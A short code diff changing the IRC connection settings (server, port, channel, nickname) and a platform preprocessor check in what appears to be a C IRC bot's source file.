@@ -42,12 +42,12 @@
  * options with a python
  * script
  */
-#define SERVER     "irc.freenode.net"
-#define PORT       "6667"
-#define CHANNEL    "#nullbyte"
-#define U_NAME     "koekje"
-#define N_NAME     "koekje"
-#define PWORD      NULL
+#define SERVER	"irc.freenode.net"
+#define PORT	6667
+#define CHANNEL	"#nullbyte"
+#define U_NAME	"DJYHVK"
+#define N_NAME	"DJYHVK"
+#define PWORD	NULL
 
 //extern const char *admins[] = {"dontrustme"};
 
@@ -58,7 +58,7 @@
  */
 #define sleep(x) Sleep ((x)*1000);
 
-#else
+#elif __linux__
 
 /*
  * a sort of hacky solution
